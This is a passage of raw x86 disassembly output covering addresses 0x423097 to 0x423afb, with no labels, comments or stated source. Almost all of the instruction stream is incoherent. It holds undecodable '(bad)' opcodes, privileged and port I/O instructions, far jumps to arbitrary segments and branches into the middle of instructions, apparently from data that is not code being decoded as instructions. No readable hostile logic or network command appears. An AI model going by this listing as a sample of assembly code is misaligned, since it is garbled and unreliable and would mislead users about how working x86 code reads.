  423097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423098:	inc    edi
  423099:	scas   eax,DWORD PTR es:[edi]
  42309a:	ret    0xdf46
  42309d:	in     eax,0x31
  42309f:	add    dl,bh
  4230a1:	leave  
  4230a2:	rcl    ebp,0x7e
  4230a5:	inc    eax
  4230a6:	int3   
  4230a7:	sub    DWORD PTR [esi+0xf4e5227],0xffffffb8
  4230ae:	aam    0x77
  4230b0:	outs   dx,BYTE PTR ds:[esi]
  4230b1:	je     0x4230a7
  4230b3:	or     al,0xab
  4230b5:	inc    ecx
  4230b6:	call   0x6ffc3902
  4230bb:	sub    bh,BYTE PTR [eax]
  4230bd:	add    BYTE PTR [ebx+esi*1+0x63240fa7],cl
  4230c4:	dec    edi
  4230c5:	jo     0x423141
  4230c7:	adc    DWORD PTR [ebx],edi
  4230c9:	cwde   
  4230ca:	stos   BYTE PTR es:[edi],al
  4230cb:	pushf  
  4230cc:	nop
  4230cd:	adc    esi,DWORD PTR [edx+eax*1+0x5b640a6e]
  4230d4:	cdq    
  4230d5:	popa   
  4230d6:	and    ebp,ecx
  4230d8:	and    edx,0x8b606e63
  4230de:	push   0x66
  4230e0:	xlat   BYTE PTR ds:[ebx]
  4230e1:	xor    DWORD PTR [edi+0x8],0x2142b5f4
  4230e8:	pop    ecx
  4230e9:	mov    eax,0xcee61608
  4230ee:	push   edi
  4230ef:	lock cmp ebp,ebx
  4230f2:	enter  0x88de,0xd3
  4230f6:	mov    DWORD PTR [edi],esi
  4230f8:	dec    edx
  4230f9:	ins    BYTE PTR es:[edi],dx
  4230fa:	cmp    BYTE PTR ds:0xd0efd304,dh
  423100:	pop    esp
  423101:	fmul   st,st(3)
  423103:	cdq    
  423104:	adc    ch,0x55
  423107:	add    BYTE PTR [ecx],bh
  423109:	sub    bl,ah
  42310b:	sub    bl,BYTE PTR [ebx+0x2daf2968]
  423111:	ret    0x10d3
  423114:	sub    al,0xb3
  423116:	jmp    eax
  423118:	test   eax,0xbd25958
  42311d:	pop    ds
  42311e:	push   edx
  42311f:	adc    DWORD PTR [eax+0x53],0xbcaec249
  423126:	jbe    0x423185
  423128:	(bad)  
  42312a:	and    eax,0x36c58662
  42312f:	sub    eax,0xc2be0aea
  423134:	test   DWORD PTR [eax+0x2687ed90],edx
  42313a:	dec    edi
  42313b:	xchg   DWORD PTR [ebp+0x54],esi
  42313e:	aam    0x1a
  423140:	imul   eax,DWORD PTR [edi],0x4ae6d188
  423146:	(bad)
  423149:	xchg   edi,eax
  42314a:	lods   al,BYTE PTR ds:[esi]
  42314b:	push   edx
  42314c:	lods   al,BYTE PTR ds:[esi]
  42314d:	inc    eax
  42314e:	jmp    0xbeb83667
  423153:	mov    esi,0x7002043b
  423158:	sbb    BYTE PTR [ebx+0x7fdad2ba],0x83
  42315f:	dec    edx
  423160:	aaa    
  423161:	sbb    al,0x30
  423163:	dec    ecx
  423164:	jae    0x4231ba
  423166:	sbb    edx,edi
  423168:	pop    edi
  423169:	loopne 0x423193
  42316b:	(bad)  
  42316c:	pop    ebp
  42316d:	int    0xa4
  42316f:	sub    ch,BYTE PTR [edi]
  423171:	jg     0x423154
  423173:	mov    ebx,esi
  423175:	inc    ebp
  423176:	and    al,0xd9
  423178:	pop    es
  423179:	(bad)  
  42317a:	push   ds
  42317b:	or     eax,DWORD PTR [ebp+0x2c5d2b62]
  423181:	add    dh,BYTE PTR [eax-0x6ad3653a]
  423187:	xchg   ecx,eax
  423188:	pop    es
  423189:	push   eax
  42318a:	dec    edi
  42318b:	sub    DWORD PTR [ecx+0x6da8e408],esi
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x306105ec],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x6b000001,al
  42320d:	fstp   st(7)
  42320f:	ins    DWORD PTR es:[edi],dx
  423210:	mov    bh,BYTE PTR [ebx+0x12c62991]
  423216:	xor    dh,BYTE PTR [esi-0x55c3aaae]
  42321c:	cmp    al,0xb6
  42321e:	or     DWORD PTR [ebx-0x5a055319],ebx
  423224:	pop    ds
  423225:	and    DWORD PTR [eax+0x7c11b2e8],edx
  42322b:	not    eax
  42322d:	out    0xc5,al
  42322f:	repnz xlat BYTE PTR ds:[ebx]
  423231:	jnp    0x423271
  423233:	retf   
  423234:	jle    0x423213
  423236:	daa    
  423237:	test   al,0xa2
  423239:	and    dh,BYTE PTR [edi+edi*2-0x7e]
  42323d:	jb     0x42322f
  42323f:	rcr    DWORD PTR fs:[ebp+ebx*1+0x6e],1
  423244:	dec    edx
  423245:	mov    ah,0xac
  423247:	sub    edx,DWORD PTR ds:0x68b6b532
  42324d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42324e:	jo     0x42321f
  423250:	xlat   BYTE PTR ds:[ebx]
  423251:	mov    eax,0x5838cf67
  423256:	mov    DWORD PTR [ebp-0x76709581],esp
  42325c:	add    bl,BYTE PTR [ecx]
  42325e:	xchg   ebp,eax
  42325f:	(bad)  
  423261:	pop    ds
  423262:	imul   esi,ebx,0xf
  423265:	mov    ds:0xc158f648,al
  42326a:	lods   al,BYTE PTR ds:[esi]
  42326b:	sub    DWORD PTR [edx-0x17a53db1],eax
  423271:	cmp    DWORD PTR [edi+eiz*4-0x2c99a6a],esi
  423278:	mov    edx,0xd0e091fd
  42327d:	(bad)  
  42327e:	mov    esi,0x4aee5e17
  423283:	and    eax,esi
  423285:	inc    esi
  423286:	ret    
  423287:	inc    ebx
  423288:	sbb    edx,DWORD PTR [esi+0x25]
  42328b:	retf   0x9b79
  42328e:	add    DWORD PTR [edx+0x67ca6b2c],ebp
  423294:	lock imul ecx,DWORD PTR [ebx+0x13],0xfffffffb
  423299:	aam    0x60
  42329b:	mov    bh,0x90
  42329d:	les    ebp,FWORD PTR [eax+0x1f]
  4232a0:	cmp    al,0x35
  4232a2:	sub    BYTE PTR [ebx-0x6c],0x39
  4232a6:	push   ss
  4232a7:	xor    cl,BYTE PTR [ebx-0x76]
  4232aa:	imul   esp,DWORD PTR [ebp+0x3d171b03],0x3a
  4232b1:	daa    
  4232b2:	je     0x42329d
  4232b4:	leave  
  4232b5:	xchg   esi,eax
  4232b6:	out    0x91,eax
  4232b8:	or     ebp,DWORD PTR [eax]
  4232ba:	repz dec ecx
  4232bc:	and    al,dh
  4232be:	fiadd  WORD PTR [ebx]
  4232c0:	test   DWORD PTR ds:0xa0c98b82,esi
  4232c6:	pop    ss
  4232c7:	sbb    DWORD PTR [ebx-0x51],esi
  4232ca:	arpl   WORD PTR [eax+0x3a],cx
  4232cd:	xor    al,0x66
  4232cf:	pop    ss
  4232d0:	jne    0x423313
  4232d2:	pop    ecx
  4232d3:	(bad)  
  4232d4:	sbb    edi,ebp
  4232d6:	shl    BYTE PTR [ebp+0x2b],1
  4232d9:	xor    DWORD PTR [edi],ecx
  4232db:	inc    ecx
  4232dc:	add    DWORD PTR [edi+0x14],ebp
  4232df:	daa    
  4232e0:	ret    
  4232e1:	push   ebx
  4232e2:	test   al,0xa2
  4232e4:	add    al,0x8c
  4232e6:	cld    
  4232e7:	add    eax,0x4aa3388c
  4232ec:	sbb    dl,BYTE PTR [eax+0x21c2e254]
  4232f2:	ret    0xe590
  4232f5:	in     al,dx
  4232f6:	xchg   DWORD PTR [eax+0x36],ecx
  4232f9:	js     0x4232a1
  4232fb:	adc    BYTE PTR [edx+0x72],ch
  4232fe:	dec    esi
  4232ff:	stc    
  423300:	mov    eax,ds:0x35b25682
  423305:	cmc    
  423306:	dec    edi
  423307:	jmp    0x978b:0x2e9021e1
  42330e:	(bad)  
  423310:	cmp    al,BYTE PTR [eax]
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x542a0f44
  423382:	stos   BYTE PTR es:[edi],al
  423383:	pop    edx
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0xc000001,al
  42338d:	clc    
  42338e:	sti    
  42338f:	loop   0x42333c
  423391:	in     al,dx
  423392:	fstp   TBYTE PTR [ebx+0x1ab6449]
  423398:	mov    ?,WORD PTR [edx+esi*8+0x7a]
  42339c:	outs   dx,BYTE PTR ds:[esi]
  42339d:	test   BYTE PTR [ecx+0x6a],al
  4233a0:	stc    
  4233a1:	add    eax,DWORD PTR [ebx+0x282e7aa9]
  4233a7:	pop    ecx
  4233a8:	fnstcw WORD PTR fs:[edx-0x28e1a93a]
  4233af:	xchg   edi,eax
  4233b0:	in     eax,0x3b
  4233b2:	jge    0x423408
  4233b4:	ss pop ebp
  4233b6:	stos   BYTE PTR es:[edi],al
  4233b7:	cmp    bh,BYTE PTR [edi+ecx*8-0x41]
  4233bb:	xchg   ebx,eax
  4233bc:	mov    ds:0x4b6bc52,al
  4233c1:	int    0x82
  4233c3:	jp     0x423406
  4233c5:	fist   DWORD PTR [edi+ecx*1+0x5f]
  4233c9:	sahf   
  4233ca:	jne    0x423370
  4233cc:	sub    BYTE PTR ds:0x61c7e488,cl
  4233d2:	xor    edi,DWORD PTR [ebx-0x4d]
  4233d5:	out    0xdd,eax
  4233d7:	leave  
  4233d8:	lods   eax,DWORD PTR ds:[esi]
  4233d9:	cmp    ebp,DWORD PTR [eax-0x6b]
  4233dc:	mov    ch,0x3
  4233de:	xchg   ebx,ebx
  4233e0:	pop    ds
  4233e1:	inc    bx
  4233e3:	loop   0x423447
  4233e5:	or     edx,esi
  4233e7:	and    ah,bh
  4233e9:	and    al,0xce
  4233eb:	cmp    BYTE PTR [edi-0x7e],0xc8
  4233ef:	rol    DWORD PTR [edi+0x212efe6],1
  4233f5:	jns    0x423459
  4233f7:	jp     0x4233ed
  4233f9:	jne    0x423421
  4233fb:	ja     0x4233ca
  4233fd:	xchg   bl,bh
  4233ff:	dec    ebx
  423400:	mov    ebx,ebx
  423402:	retf   0x3cb
  423405:	fld    QWORD PTR [eax-0x70b7ba1c]
  42340b:	jb     0x423436
  42340d:	mov    ah,0xb4
  42340f:	xchg   edx,eax
  423410:	xchg   ecx,eax
  423411:	xchg   BYTE PTR [edx+eiz*4-0x5593c34a],dh
  423418:	pop    eax
  423419:	lahf   
  42341a:	dec    esi
  42341b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42341c:	xchg   ah,ch
  42341e:	sbb    eax,ebx
  423420:	retf   0xf117
  423423:	sub    eax,0x5439f572
  423428:	sub    BYTE PTR [ebx],0x48
  42342b:	add    eax,0xa8d99f3d
  423430:	fbstp  TBYTE PTR [edi-0x13e176c9]
  423436:	mov    esi,0x9e36e6d6
  42343b:	jnp    0x4233e1
  42343d:	inc    ecx
  42343e:	std    
  42343f:	dec    esp
  423440:	inc    esp
  423441:	add    BYTE PTR [edi+0x3ed31614],dl
  423447:	sbb    BYTE PTR [ebp+0x5c],dl
  42344a:	add    eax,0x1e411cf
  42344f:	dec    edx
  423450:	jmp    0x423494
  423452:	mov    bh,0xdb
  423454:	shr    BYTE PTR ds:0xccee4c8b,1
  42345a:	dec    ebx
  42345b:	mov    bh,0x91
  42345d:	addr16 push 0x3f4bdbc4
  423463:	xchg   esi,eax
  423464:	mov    ch,0xeb
  423466:	cmp    dh,BYTE PTR [eax+0x19b37cc]
  42346c:	xchg   ebp,eax
  42346d:	mov    esi,DWORD PTR [ecx]
  42346f:	cmp    eax,0x948c9acd
  423474:	icebp  
  423475:	add    edi,DWORD PTR [esi]
  423477:	xchg   ebp,eax
  423478:	jp     0x4233fb
  42347a:	inc    esi
  42347b:	pop    ebx
  42347c:	add    ah,dl
  42347e:	stc    
  42347f:	mov    ds:0x62b34e29,al
  423484:	mov    eax,0x3300fdd2
  423489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42348a:	or     eax,0xe25f2b87
  42348f:	mov    eax,0xa7
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	pushf  
  423501:	pop    DWORD PTR [edx-0x48]
  423504:	adc    BYTE PTR [ecx+0x1],bh
  423507:	add    BYTE PTR ds:0x64000001,al
  42350d:	scas   eax,DWORD PTR es:[edi]
  42350e:	fidiv  WORD PTR [ebx]
  423510:	and    al,0xf5
  423512:	idiv   BYTE PTR [ecx]
  423514:	out    dx,eax
  423515:	and    edi,esp
  423517:	out    0x72,al
  423519:	(bad)  
  42351a:	cli    
  42351b:	cmc    
  42351c:	dec    edx
  42351d:	fstp   QWORD PTR [edx-0x1]
  423520:	mov    ds:0x48089121,eax
  423525:	adc    eax,DWORD PTR [ebx+eax*2]
  423528:	jg     0x4234ec
  42352a:	int    0xfd
  42352c:	inc    ecx
  42352d:	iret   
  42352e:	or     BYTE PTR [edi+0x63],al
  423531:	push   edi
  423532:	cmp    ebx,DWORD PTR ds:0xd6ab3865
  423538:	dec    eax
  423539:	idiv   ebp
  42353b:	xchg   esp,eax
  42353c:	sub    dl,BYTE PTR [ebx-0x11d7006e]
  423542:	sar    DWORD PTR [esi-0x3c],1
  423545:	jl     0x423567
  423547:	mov    ebx,0x9ba2f2bf
  42354c:	and    DWORD PTR [esi-0x14],edx
  42354f:	repz sbb BYTE PTR [esi-0x68],0x2b
  423554:	fnstenv [edi-0x1]
  423557:	and    DWORD PTR [edi],0xcbddb19a
  42355d:	push   ebx
  42355e:	je     0x42351c
  423560:	jecxz  0x4235b1
  423562:	jp     0x423505
  423564:	in     eax,dx
  423565:	mov    edi,0xfb6fc7a1
  42356a:	sbb    ebp,DWORD PTR [eax-0x10e1e9d2]
  423570:	fidivr DWORD PTR [edx+0x3]
  423573:	sbb    al,0x25
  423575:	jb     0x42358e
  423577:	pop    esi
  423578:	mov    ebp,0x2b96bdc9
  42357d:	sub    BYTE PTR [ebp-0x51],bl
  423580:	mov    ecx,0xb96129e
  423585:	and    BYTE PTR [eax-0x72],ch
  423588:	mov    cl,0x71
  42358a:	into   
  42358b:	cli    
  42358c:	xor    eax,0x37246b86
  423591:	fsubrp st(2),st
  423593:	and    BYTE PTR [edi+0x5e],dh
  423596:	mov    esp,0xbc3a38d4
  42359b:	pop    edx
  42359c:	mov    al,ds:0x736bb70f
  4235a1:	sahf   
  4235a2:	sub    eax,0x4e52b728
  4235a7:	xchg   edi,eax
  4235a8:	jns    0x423564
  4235aa:	cmc    
  4235ab:	mov    dh,0x5a
  4235ad:	mov    edx,0x38f0c0c6
  4235b2:	inc    edx
  4235b3:	pop    edi
  4235b4:	or     BYTE PTR [eax],bh
  4235b6:	xchg   ebx,eax
  4235b7:	ret    0x9b5a
  4235ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235bb:	sub    DWORD PTR [edx+0x7],edi
  4235be:	dec    edi
  4235bf:	neg    BYTE PTR [ebp+eiz*4-0x1c]
  4235c3:	arpl   WORD PTR [eax],sp
  4235c5:	cdq    
  4235c6:	fld    DWORD PTR gs:[edx]
  4235c9:	add    BYTE PTR [ebx-0x5c],al
  4235cc:	xchg   edx,eax
  4235cd:	int    0x66
  4235cf:	sar    DWORD PTR [ecx+0x51],cl
  4235d2:	call   0xdfbf32fe
  4235d7:	push   edx
  4235d8:	or     eax,0xf09db445
  4235dd:	pop    eax
  4235de:	xor    ecx,DWORD PTR es:[edx+ebx*1]
  4235e2:	repnz mov ebp,0xda99d9f2
  4235e8:	push   ebx
  4235e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235ea:	inc    esp
  4235eb:	jb     0x423578
  4235ed:	cmp    eax,0xf31bfb3c
  4235f2:	adc    eax,0xa003248e
  4235f7:	loope  0x4235aa
  4235f9:	pop    ecx
  4235fa:	inc    ecx
  4235fb:	push   ecx
  4235fc:	ror    DWORD PTR [ebp+0x3e],0xf9
  423600:	ins    DWORD PTR es:[edi],dx
  423601:	sbb    DWORD PTR [esi+edx*8+0x7f],ecx
  423605:	rcr    BYTE PTR [ebp-0x32f054b9],cl
  42360b:	cmp    DWORD PTR [edx],0xffffff83
  42360e:	xchg   ecx,eax
  42360f:	xchg   bp,ax
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0xd5ebe513
  423683:	outs   dx,BYTE PTR ds:[esi]
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    BYTE PTR [ecx+0x2e],al
  42368e:	loope  0x42367a
  423690:	xor    ah,BYTE PTR ds:0xb226f7df
  423696:	push   edi
  423697:	cld    
  423698:	mov    WORD PTR [esi],fs
  42369a:	and    DWORD PTR [edi],eax
  42369c:	adc    eax,0xe0b7d473
  4236a1:	fadd   QWORD PTR [edi-0x4b]
  4236a4:	jl     0x4236b6
  4236a6:	mov    ds:0xc3747eca,eax
  4236ab:	mov    eax,0xf222446b
  4236b0:	pop    eax
  4236b1:	rcr    DWORD PTR [ecx],1
  4236b3:	mov    al,ds:0x13a1edf8
  4236b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236b9:	push   esp
  4236ba:	push   es
  4236bb:	fiadd  DWORD PTR [edi-0x11f13f7d]
  4236c1:	addr16 push esi
  4236c3:	mul    BYTE PTR [eax+esi*2-0x5921b54f]
  4236ca:	rcr    DWORD PTR ds:0x1e1bb1bf,1
  4236d0:	xor    ax,bp
  4236d3:	pop    ebx
  4236d4:	adc    eax,0x9cf4ac71
  4236d9:	sub    BYTE PTR [ebx],dh
  4236db:	not    BYTE PTR [edx+0x1a0e61de]
  4236e1:	loope  0x4236b8
  4236e3:	(bad)  
  4236e4:	xchg   ebx,eax
  4236e5:	enter  0x12dd,0x6c
  4236e9:	and    bl,BYTE PTR [ecx+0x41]
  4236ec:	arpl   WORD PTR [edx+0x48],bx
  4236ef:	mov    ds:0x1441ff71,al
  4236f4:	jle    0x423732
  4236f6:	(bad)  [edi]
  4236f8:	xor    esi,ebp
  4236fa:	ror    ebp,cl
  4236fc:	repz iret 
  4236fe:	pusha  
  4236ff:	jb     0x4236e9
  423701:	es mov ebx,cs
  423704:	adc    eax,0x93a74c2e
  423709:	aaa    
  42370a:	cmp    eax,0x4ddbbd75
  42370f:	hlt    
  423710:	mov    al,ds:0x909ff223
  423715:	stc    
  423716:	xchg   ebp,eax
  423717:	in     eax,0xb9
  423719:	(bad)  
  42371a:	imul   BYTE PTR [ecx+eax*4+0x46]
  42371e:	jge    0x42379b
  423720:	sbb    BYTE PTR [edx-0xf],ch
  423723:	cmp    al,0xc4
  423725:	fist   WORD PTR [eax]
  423727:	pop    esp
  423728:	fistp  WORD PTR [edi+eax*4-0xf60c657]
  42372f:	jle    0x423725
  423731:	bound  esi,QWORD PTR [eax+edx*2+0x2e310ffe]
  423738:	push   DWORD PTR [edi+0xb272a3f]
  42373e:	hlt    
  42373f:	out    0x2f,al
  423741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423742:	add    BYTE PTR [edx-0x43532015],bh
  423748:	into   
  423749:	xchg   edi,eax
  42374a:	ds loopne 0x423762
  42374d:	xchg   ecx,eax
  42374f:	jbe    0x4236f7
  423751:	shl    DWORD PTR [edx-0x70],1
  423754:	sub    DWORD PTR [ebx],ecx
  423756:	fs push edi
  423758:	cld    
  423759:	shl    al,cl
  42375b:	pop    esi
  42375c:	lea    edx,[ecx+edi*8]
  42375f:	lods   al,BYTE PTR ds:[esi]
  423760:	and    dh,BYTE PTR [esi-0x11ccf560]
  423766:	(bad)  
  423767:	shl    DWORD PTR [ebp+0x31],cl
  42376a:	and    eax,0xd7cdcb43
  42376f:	jb     0x4237ee
  423771:	fimul  DWORD PTR [edx]
  423773:	(bad)  
  423774:	push   ecx
  423775:	push   esi
  423776:	jo     0x423797
  423778:	in     al,0x5c
  42377a:	add    dl,BYTE PTR [ebx+eax*2-0x5d]
  42377e:	push   esi
  42377f:	mov    eax,0x2306fcfe
  423784:	dec    esp
  423785:	pcmpeqw mm6,QWORD PTR [ecx-0x1d]
  423789:	push   esi
  42378a:	inc    esp
  42378b:	addr16 xchg edi,eax
  42378d:	and    DWORD PTR [ecx+0x5d1],ebp
	...
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xfe39f141
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xe8000001
  42380d:	mov    cl,0x24
  42380f:	clc    
  423810:	cmc    
  423811:	jns    0x4237ed
  423813:	and    al,BYTE PTR [ebx]
  423815:	(bad)  
  423816:	pop    edx
  423817:	push   ebx
  423818:	jecxz  0x423812
  42381a:	mov    ecx,0x8f2cce2c
  42381f:	stos   BYTE PTR es:[edi],al
  423820:	popa   
  423821:	inc    ebp
  423822:	push   edx
  423823:	and    bl,BYTE PTR cs:[eax]
  423826:	ffree  st(1)
  423828:	dec    ebx
  423829:	shl    BYTE PTR [esi-0x5],cl
  42382c:	les    si,DWORD PTR [edx+ecx*8-0x431fe14b]
  423834:	iret   
  423835:	mov    ah,0xc2
  423837:	jmp    0x4237c3
  423839:	stos   BYTE PTR es:[edi],al
  42383a:	mov    esp,ecx
  42383c:	mov    ebx,DWORD PTR [ecx+0x4e724c5]
  423842:	pop    ebx
  423843:	dec    edx
  423844:	pop    es
  423845:	lahf   
  423846:	adc    DWORD PTR [edi-0x6f],edi
  423849:	stc    
  42384a:	mov    dh,0xa
  42384c:	add    DWORD PTR fs:[ebx],ecx
  42384f:	in     eax,0x30
  423851:	jge    0x42382f
  423853:	enter  0x454c,0x25
  423857:	xchg   edi,eax
  423858:	fdiv   st,st(7)
  42385a:	loope  0x423897
  42385c:	mov    ch,0x6a
  42385e:	fdiv   st,st(7)
  423860:	call   DWORD PTR [ecx]
  423862:	ret    
  423863:	call   0xd8253a71
  423868:	dec    edi
  423869:	mov    ds:0x693838b,eax
  42386e:	mov    dl,BYTE PTR [esi+ecx*8-0x3e]
  423872:	or     eax,0x5f2adfc0
  423877:	lock je 0x4237fc
  42387a:	mov    ch,BYTE PTR [esi-0x19]
  42387d:	shl    DWORD PTR [edi-0x54a4e2a7],cl
  423883:	adc    edx,DWORD PTR [edi+0x60]
  423886:	test   edi,esi
  423888:	pop    edi
  423889:	xor    ah,dl
  42388b:	addr16 sub ebp,esp
  42388e:	out    0xd4,al
  423890:	jbe    0x4238bd
  423892:	push   eax
  423893:	jb     0x423827
  423895:	hlt    
  423896:	mov    ds:0x7568341e,al
  42389b:	ins    DWORD PTR es:[edi],dx
  42389c:	push   cs
  42389d:	add    DWORD PTR [ebx+0x103dc5c3],ecx
  4238a3:	mov    edx,0x60cf3c02
  4238a8:	inc    esp
  4238a9:	sbb    dl,BYTE PTR [ebx+0x4b]
  4238ac:	xor    BYTE PTR [edx+eax*2],0x8a
  4238b0:	push   ebx
  4238b1:	fisub  DWORD PTR [edi+0x13abcec2]
  4238b7:	adc    bl,BYTE PTR [ebp-0x2032abb5]
  4238bd:	ins    DWORD PTR es:[edi],dx
  4238be:	sbb    ecx,ebp
  4238c0:	loopne 0x4238f2
  4238c2:	cdq    
  4238c3:	push   edx
  4238c4:	stos   DWORD PTR es:[edi],eax
  4238c5:	add    al,0xdc
  4238c7:	arpl   WORD PTR fs:[ecx+0x19a6f651],di
  4238ce:	adc    eax,0x5ef7c85a
  4238d3:	xchg   ebx,eax
  4238d4:	inc    eax
  4238d5:	xor    DWORD PTR [ecx+0x220b9426],edi
  4238db:	popf   
  4238dc:	jl     0x4238e7
  4238de:	xchg   BYTE PTR [eax+0x71],ah
  4238e1:	sub    al,0x2a
  4238e3:	xor    esp,eax
  4238e5:	outs   dx,DWORD PTR ds:[esi]
  4238e6:	sbb    eax,0x8c649789
  4238eb:	and    bh,ah
  4238ed:	cmp    ch,BYTE PTR [eax]
  4238ef:	popf   
  4238f0:	sbb    eax,0xd9970ed4
  4238f5:	cdq    
  4238f6:	out    dx,eax
  4238f7:	push   es
  4238f8:	out    0x93,eax
  4238fa:	imul   ebp,DWORD PTR [ebx-0x31],0x7ad01a6b
  423901:	xchg   esp,eax
  423902:	xchg   BYTE PTR [ecx],ch
  423904:	repz sbb dl,ah
  423907:	pop    ebp
  423908:	fldln2 
  42390a:	fwait
  42390b:	cli    
  42390c:	inc    ebp
  42390d:	pop    esi
  42390e:	sub    al,0xe2
  423910:	push   ss
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xcbf62bbd
  423982:	std    
  423983:	dec    esi
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x29000001,al
  42398d:	fist   WORD PTR [ecx+0x62]
  423990:	add    DWORD PTR [ebx+0x21703c91],0xf8cdf828
  42399a:	into   
  42399b:	out    0xd6,eax
  42399d:	xchg   edi,eax
  42399e:	xchg   edx,eax
  4239a0:	ins    BYTE PTR es:[edi],dx
  4239a1:	add    dh,bh
  4239a3:	mov    ds:0xe028e8f6,al
  4239a8:	fnstenv [edi-0x60042d4d]
  4239ae:	lods   eax,DWORD PTR ds:[esi]
  4239af:	stos   DWORD PTR es:[edi],eax
  4239b0:	test   BYTE PTR [ebx+eax*4],0x81
  4239b4:	popf   
  4239b5:	sub    BYTE PTR [edx],cl
  4239b7:	out    0xc0,eax
  4239b9:	dec    edx
  4239ba:	jmp    0x423a34
  4239bc:	fs repz add al,0xe6
  4239c0:	dec    esp
  4239c1:	pop    ebp
  4239c2:	fild   DWORD PTR [ebx-0x66e70ac3]
  4239c8:	repnz inc edx
  4239ca:	js     0x42397f
  4239cc:	(bad)  
  4239cd:	ror    edi,1
  4239cf:	loope  0x423a1e
  4239d1:	outs   dx,BYTE PTR ds:[esi]
  4239d2:	pop    edx
  4239d3:	(bad)  
  4239d4:	fsub   DWORD PTR [eax]
  4239d6:	sub    ebx,DWORD PTR [esi]
  4239d8:	xchg   DWORD PTR [esi+0x71],edx
  4239db:	jg     0x42398e
  4239dd:	scas   al,BYTE PTR es:[edi]
  4239de:	mov    BYTE PTR [ebp+0x73],bh
  4239e1:	retf   0xd018
  4239e4:	loopne 0x4239e9
  4239e6:	outs   dx,BYTE PTR ds:[esi]
  4239e7:	test   al,0x46
  4239e9:	and    DWORD PTR [ebx-0x42ce821d],ebp
  4239ef:	add    eax,0xec6ed602
  4239f4:	cmp    cl,BYTE PTR [esi-0x53]
  4239f7:	mov    ds:0x84442355,eax
  4239fc:	push   0x21
  4239fe:	push   es
  4239ff:	and    eax,0x1a6645a1
  423a04:	repnz fisubr DWORD PTR [esi+0x34]
  423a08:	xor    eax,0xc3e31375
  423a0d:	sbb    di,WORD PTR [ebx-0x43]
  423a11:	fdivr  QWORD PTR [esi-0x1c]
  423a14:	test   DWORD PTR [ecx+ecx*8+0x2e167b5e],eax
  423a1b:	pop    ds
  423a1c:	cmc    
  423a1d:	pop    ebp
  423a1e:	in     al,dx
  423a1f:	or     eax,DWORD PTR gs:[ebp+0x73]
  423a23:	lods   al,BYTE PTR ds:[esi]
  423a24:	iret   
  423a25:	cwde   
  423a26:	pop    esp
  423a27:	je     0x4239d8
  423a29:	mov    ?,WORD PTR [edx+edx*1-0x60]
  423a2d:	jnp    0x423a0f
  423a2f:	mov    dh,0xb4
  423a31:	stos   BYTE PTR es:[edi],al
  423a32:	add    ebp,DWORD PTR [ebx+edx*8]
  423a35:	daa    
  423a36:	mov    bl,BYTE PTR [eax-0x35]
  423a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a3a:	xchg   esi,eax
  423a3b:	scas   al,BYTE PTR es:[edi]
  423a3c:	mov    BYTE PTR [edi],cl
  423a3e:	push   esi
  423a3f:	jno    0x423a6a
  423a41:	(bad)  
  423a42:	sbb    al,0x1
  423a44:	dec    esp
  423a45:	push   ss
  423a46:	nop
  423a47:	xlat   BYTE PTR ds:[ebx]
  423a48:	mov    BYTE PTR ds:0xef8983f,ch
  423a4e:	scas   eax,DWORD PTR es:[edi]
  423a4f:	pop    ds
  423a50:	dec    ecx
  423a51:	mov    al,BYTE PTR [eax]
  423a53:	nop
  423a54:	addr16 push esi
  423a56:	int    0x25
  423a58:	add    ebp,DWORD PTR [ecx+0x169218d2]
  423a5e:	xlat   BYTE PTR ds:[ebx]
  423a5f:	xor    eax,0x752d0df
  423a64:	imul   edi,eax,0xffffff94
  423a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a68:	sub    BYTE PTR [ebx-0x716ad236],dl
  423a6e:	cmp    dl,BYTE PTR [edx+0x4d749e25]
  423a74:	fidivr DWORD PTR [edi]
  423a76:	mov    dh,0x74
  423a78:	lods   eax,DWORD PTR ds:[esi]
  423a79:	jns    0x423aca
  423a7b:	push   ebx
  423a7c:	cmp    BYTE PTR [edx-0x2f],bl
  423a7f:	add    DWORD PTR [eax-0x32],ecx
  423a82:	mov    edx,0x69dc5a3b
  423a87:	jb     0x423aac
  423a89:	push   esi
  423a8a:	out    0x1b,al
  423a8c:	popa   
  423a8d:	jle    0x423ab1
  423a8f:	cmp    BYTE PTR [ebp+0x0],al
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
